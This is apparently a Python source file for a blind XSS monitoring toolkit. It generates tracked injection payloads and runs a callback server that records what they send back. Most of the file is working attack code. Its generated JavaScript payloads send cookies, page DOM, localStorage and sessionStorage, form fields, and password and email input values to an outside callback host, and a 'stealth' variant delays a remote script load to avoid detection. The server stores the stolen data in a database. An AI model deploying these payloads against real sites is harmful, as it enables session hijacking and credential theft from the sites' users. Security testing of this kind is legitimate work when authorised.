"""
Blind XSS Monitor - OOB Callback Infrastructure
Monitors for out-of-band XSS callbacks
"""

import sqlite3
import json
import hashlib
import time
import base64
from typing import List, Dict, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime

# Optional dependencies
try:
    import aiohttp
    from aiohttp import web
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    import asyncio
    ASYNCIO_AVAILABLE = True
except ImportError:
    ASYNCIO_AVAILABLE = False


@dataclass
class BlindXSSPayload:
    """Represents a blind XSS payload"""
    payload_id: str
    payload: str
    target_url: str
    injection_point: str
    created_at: float
    callback_url: str
    tags: List[str] = field(default_factory=list)


@dataclass
class BlindXSSCallback:
    """Represents a received blind XSS callback"""
    callback_id: str
    payload_id: str
    triggered_at: float
    user_agent: str
    ip_address: str
    cookies: Dict = field(default_factory=dict)
    dom_content: str = ""
    screenshot: str = ""
    location: str = ""
    referrer: str = ""
    additional_data: Dict = field(default_factory=dict)


class BlindXSSMonitor:
    """
    Complete Blind XSS monitoring infrastructure
    - Generates trackable payloads
    - Hosts callback server
    - Captures execution evidence
    - Sends notifications
    """
    
    def __init__(self, callback_domain: str, callback_port: int = 8888,
                 db_path: str = 'blind_xss.db'):
        self.callback_domain = callback_domain
        self.callback_port = callback_port
        self.db_path = db_path
        
        # Initialize database
        self._init_database()
        
        # Payload tracking
        self.active_payloads: Dict[str, BlindXSSPayload] = {}
        self.callbacks_received: Dict[str, BlindXSSCallback] = {}
        
        # Notification settings
        self.notification_callbacks: List[Callable] = []
        self.email_notifications = False
        self.webhook_url = None
        
        # Server
        self.app = None
        self.runner = None
        
        if not AIOHTTP_AVAILABLE:
            print("[WARN] aiohttp not available. Server functionality will be limited.")
        
        print(f"[BLIND] Blind XSS Monitor initialized")
        print(f"   Callback domain: {callback_domain}")
        print(f"   Callback port: {callback_port}")
    
    def _init_database(self):
        """Initialize SQLite database for persistence"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Payloads table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS payloads (
                payload_id TEXT PRIMARY KEY,
                payload TEXT,
                target_url TEXT,
                injection_point TEXT,
                created_at REAL,
                callback_url TEXT,
                tags TEXT
            )
        """)
        
        # Callbacks table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS callbacks (
                callback_id TEXT PRIMARY KEY,
                payload_id TEXT,
                triggered_at REAL,
                user_agent TEXT,
                ip_address TEXT,
                cookies TEXT,
                dom_content TEXT,
                screenshot TEXT,
                location TEXT,
                referrer TEXT,
                additional_data TEXT,
                FOREIGN KEY (payload_id) REFERENCES payloads(payload_id)
            )
        """)
        
        conn.commit()
        conn.close()
    
    def generate_payload(self, target_url: str, injection_point: str,
                        payload_type: str = 'advanced',
                        tags: List[str] = None) -> BlindXSSPayload:
        """
        Generate a blind XSS payload with unique identifier
        
        Args:
            target_url: Target URL being tested
            injection_point: Name of injection point
            payload_type: 'simple', 'advanced', 'stealth', 'exfiltration'
            tags: Optional tags for organization
        
        Returns:
            BlindXSSPayload object
        """
        # Generate unique ID
        payload_id = hashlib.md5(
            f"{target_url}_{injection_point}_{time.time()}".encode()
        ).hexdigest()[:12]
        
        callback_url = f"http://{self.callback_domain}:{self.callback_port}/callback/{payload_id}"
        
        # Generate payload based on type
        if payload_type == 'simple':
            payload = self._generate_simple_payload(callback_url)
        elif payload_type == 'advanced':
            payload = self._generate_advanced_payload(callback_url)
        elif payload_type == 'stealth':
            payload = self._generate_stealth_payload(callback_url)
        elif payload_type == 'exfiltration':
            payload = self._generate_exfiltration_payload(callback_url)
        else:
            payload = self._generate_advanced_payload(callback_url)
        
        blind_payload = BlindXSSPayload(
            payload_id=payload_id,
            payload=payload,
            target_url=target_url,
            injection_point=injection_point,
            created_at=time.time(),
            callback_url=callback_url,
            tags=tags or []
        )
        
        # Store in database
        self._save_payload(blind_payload)
        self.active_payloads[payload_id] = blind_payload
        
        print(f"[BLIND] Generated blind XSS payload: {payload_id}")
        return blind_payload
    
    def _generate_simple_payload(self, callback_url: str) -> str:
        """Generate simple callback payload"""
        return f'<script src="{callback_url}"></script>'
    
    def _generate_advanced_payload(self, callback_url: str) -> str:
        """Generate advanced payload with data collection"""
        js_code = f"""
<script>
(function(){{
    var data = {{
        url: window.location.href,
        cookies: document.cookie,
        dom: document.documentElement.outerHTML.substring(0, 5000),
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    }};
    
    // Send data via image
    var img = new Image();
    img.src = "{callback_url}?data=" + encodeURIComponent(btoa(JSON.stringify(data)));
    
    // Also try fetch if available
    if(typeof fetch !== 'undefined') {{
        fetch("{callback_url}", {{
            method: 'POST',
            body: JSON.stringify(data),
            headers: {{'Content-Type': 'application/json'}}
        }}).catch(function(e){{}});
    }}
}})();
</script>
"""
        return js_code.strip()
    
    def _generate_stealth_payload(self, callback_url: str) -> str:
        """Generate stealthy payload that's harder to detect"""
        js_code = f"""
<script>
setTimeout(function(){{
    var s=document.createElement('script');
    s.src='{callback_url}';
    document.body.appendChild(s);
}}, 3000);
</script>
"""
        return js_code.strip()
    
    def _generate_exfiltration_payload(self, callback_url: str) -> str:
        """Generate payload that exfiltrates sensitive data"""
        js_code = f"""
<script>
(function(){{
    var sensitiveData = {{
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        forms: [],
        inputs: []
    }};
    
    // Collect form data
    document.querySelectorAll('form').forEach(function(form){{
        var formData = {{}};
        form.querySelectorAll('input, textarea, select').forEach(function(input){{
            if(input.name) formData[input.name] = input.value;
        }});
        sensitiveData.forms.push(formData);
    }});
    
    // Collect all input values
    document.querySelectorAll('input[type="password"], input[type="email"]').forEach(function(input){{
        sensitiveData.inputs.push({{
            type: input.type,
            name: input.name,
            value: input.value
        }});
    }});
    
    // Exfiltrate
    fetch("{callback_url}", {{
        method: 'POST',
        body: JSON.stringify(sensitiveData),
        headers: {{'Content-Type': 'application/json'}}
    }}).catch(function(e){{}});
}})();
</script>
"""
        return js_code.strip()
    
    def _save_payload(self, payload: BlindXSSPayload):
        """Save payload to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT OR REPLACE INTO payloads 
            (payload_id, payload, target_url, injection_point, created_at, callback_url, tags)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            payload.payload_id,
            payload.payload,
            payload.target_url,
            payload.injection_point,
            payload.created_at,
            payload.callback_url,
            json.dumps(payload.tags)
        ))
        
        conn.commit()
        conn.close()
    
    def _save_callback(self, callback: BlindXSSCallback):
        """Save callback to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO callbacks 
            (callback_id, payload_id, triggered_at, user_agent, ip_address, 
             cookies, dom_content, screenshot, location, referrer, additional_data)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            callback.callback_id,
            callback.payload_id,
            callback.triggered_at,
            callback.user_agent,
            callback.ip_address,
            json.dumps(callback.cookies),
            callback.dom_content,
            callback.screenshot,
            callback.location,
            callback.referrer,
            json.dumps(callback.additional_data)
        ))
        
        conn.commit()
        conn.close()
    
    async def start_server(self):
        """Start the callback server"""
        if not AIOHTTP_AVAILABLE:
            print("[WARN] Cannot start server without aiohttp")
            return
        
        self.app = web.Application()
        
        # Routes
        self.app.router.add_get('/callback/{payload_id}', self.handle_callback_get)
        self.app.router.add_post('/callback/{payload_id}', self.handle_callback_post)
        self.app.router.add_get('/health', self.health_check)
        self.app.router.add_get('/dashboard', self.dashboard)
        
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        
        site = web.TCPSite(self.runner, '0.0.0.0', self.callback_port)
        await site.start()
        
        print(f"[BLIND] Callback server running on port {self.callback_port}")
        print(f"   Waiting for blind XSS callbacks...")
    
    async def handle_callback_get(self, request: web.Request) -> web.Response:
        """Handle GET callback (usually from <script src=>)"""
        payload_id = request.match_info['payload_id']
        
        # Extract data from query params if present
        data_param = request.query.get('data')
        if data_param:
            try:
                decoded_data = json.loads(base64.b64decode(data_param))
            except:
                decoded_data = {}
        else:
            decoded_data = {}
        
        # Process callback
        await self._process_callback(
            payload_id=payload_id,
            ip_address=request.remote,
            user_agent=request.headers.get('User-Agent', ''),
            cookies={},
            additional_data=decoded_data,
            request=request
        )
        
        # Return JavaScript that does nothing
        js_response = "// Blind XSS callback received\nconsole.log('Loaded');"
        
        return web.Response(
            text=js_response,
            content_type='application/javascript',
            headers={'Access-Control-Allow-Origin': '*'}
        )
    
    async def handle_callback_post(self, request: web.Request) -> web.Response:
        """Handle POST callback (with data payload)"""
        payload_id = request.match_info['payload_id']
        
        # Parse POST data
        try:
            post_data = await request.json()
        except:
            post_data = {}
        
        # Process callback
        await self._process_callback(
            payload_id=payload_id,
            ip_address=request.remote,
            user_agent=request.headers.get('User-Agent', ''),
            cookies=post_data.get('cookies', {}),
            additional_data=post_data,
            request=request
        )
        
        return web.Response(text='OK')
    
    async def _process_callback(self, payload_id: str, ip_address: str,
                               user_agent: str, cookies: Dict,
                               additional_data: Dict, request):
        """Process received callback"""
        # Generate callback ID
        callback_id = hashlib.md5(
            f"{payload_id}_{time.time()}".encode()
        ).hexdigest()[:12]
        
        # Extract data
        dom_content = additional_data.get('dom', '')[:10000]  # Limit size
        location = additional_data.get('url', '')
        referrer = additional_data.get('referrer', '')
        
        # Create callback object
        callback = BlindXSSCallback(
            callback_id=callback_id,
            payload_id=payload_id,
            triggered_at=time.time(),
            user_agent=user_agent,
            ip_address=ip_address,
            cookies=cookies,
            dom_content=dom_content,
            location=location,
            referrer=referrer,
            additional_data=additional_data
        )
        
        # Save to database
        self._save_callback(callback)
        self.callbacks_received[callback_id] = callback
        
        # Get original payload info
        payload_info = self.active_payloads.get(payload_id)
        
        print(f"\n[BLIND] BLIND XSS TRIGGERED!")
        print(f"   Payload ID: {payload_id}")
        print(f"   Callback ID: {callback_id}")
        print(f"   Target: {payload_info.target_url if payload_info else 'Unknown'}")
        print(f"   Location: {location}")
        print(f"   IP: {ip_address}")
        print(f"   User-Agent: {user_agent[:60]}...")
        
        # Send notifications
        await self._send_notifications(callback, payload_info)
    
    async def _send_notifications(self, callback: BlindXSSCallback, 
                                  payload_info: Optional[BlindXSSPayload]):
        """Send notifications about triggered blind XSS"""
        # Call registered callbacks
        for notify_callback in self.notification_callbacks:
            try:
                notify_callback(callback, payload_info)
            except Exception as e:
                print(f"   [WARN] Notification callback error: {e}")
    
    async def health_check(self, request: web.Request) -> web.Response:
        """Health check endpoint"""
        return web.Response(text='OK')
    
    async def dashboard(self, request: web.Request) -> web.Response:
        """Web dashboard for viewing callbacks"""
        html = f"""
        <html>
        <head><title>Blind XSS Monitor Dashboard</title></head>
        <body>
        <h1>Blind XSS Monitor Dashboard</h1>
        <p>Active Payloads: {len(self.active_payloads)}</p>
        <p>Callbacks Received: {len(self.callbacks_received)}</p>
        <h2>Recent Callbacks</h2>
        <ul>
        """
        for callback in list(self.callbacks_received.values())[-10:]:
            html += f"<li>{callback.payload_id} - {callback.ip_address} - {datetime.fromtimestamp(callback.triggered_at)}</li>"
        html += """
        </ul>
        </body>
        </html>
        """
        return web.Response(text=html, content_type='text/html')
    
    def add_notification_callback(self, callback: Callable):
        """Add custom notification callback"""
        self.notification_callbacks.append(callback)
    
    def get_statistics(self) -> Dict:
        """Get monitoring statistics"""
        return {
            'active_payloads': len(self.active_payloads),
            'total_callbacks': len(self.callbacks_received),
            'callback_port': self.callback_port,
            'callback_domain': self.callback_domain
        }
    
    async def stop_server(self):
        """Stop the callback server"""
        if self.runner:
            await self.runner.cleanup()
        print("[BLIND] Callback server stopped")


# ==================== USAGE EXAMPLE ====================

async def main():
    # Initialize monitor
    monitor = BlindXSSMonitor(
        callback_domain='your-server.com',  # Replace with your domain
        callback_port=8888
    )
    
    # Generate payloads
    payload1 = monitor.generate_payload(
        target_url='https://example.com/comment',
        injection_point='comment_field',
        payload_type='advanced',
        tags=['comment-section', 'user-generated']
    )
    
    print(f"\n[BLIND] Use this payload in your testing:")
    print(f"   {payload1.payload[:200]}...")
    
    # Start server
    await monitor.start_server()
    
    # Keep running
    try:
        while True:
            await asyncio.sleep(10)
            stats = monitor.get_statistics()
            print(f"\n[BLIND] Stats: {stats['active_payloads']} payloads, "
                  f"{stats['total_callbacks']} callbacks received")
    except KeyboardInterrupt:
        await monitor.stop_server()


if __name__ == "__main__":
    if ASYNCIO_AVAILABLE:
        asyncio.run(main())
    else:
        print("[ERROR] asyncio not available")
